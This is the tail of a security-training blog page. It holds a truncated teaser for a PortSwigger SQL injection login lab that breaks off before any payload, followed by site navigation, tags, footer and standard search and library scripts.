Goal To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user. ‚úÖ Solution In the Username field of the Login form: 1...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"><div class="btn btn-outline-primary disabled" prompt="Older"><p>-</p></div><a href="/posts/thm-hackpark/" class="btn btn-outline-primary" prompt="Newer"><p>THM - Hack Park</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> ¬© 2025 <a href="https://github.com/blueh0rse">blueh0rse</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the GNU General Public License (GPLv3) by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/portswigger/">portswigger</a> <a class="post-tag" href="/tags/gobuster/">gobuster</a> <a class="post-tag" href="/tags/ejpt/">ejpt</a> <a class="post-tag" href="/tags/auth/">auth</a> <a class="post-tag" href="/tags/blind/">blind</a> <a class="post-tag" href="/tags/bruteforce/">bruteforce</a> <a class="post-tag" href="/tags/buffer/">buffer</a> <a class="post-tag" href="/tags/cewl/">cewl</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
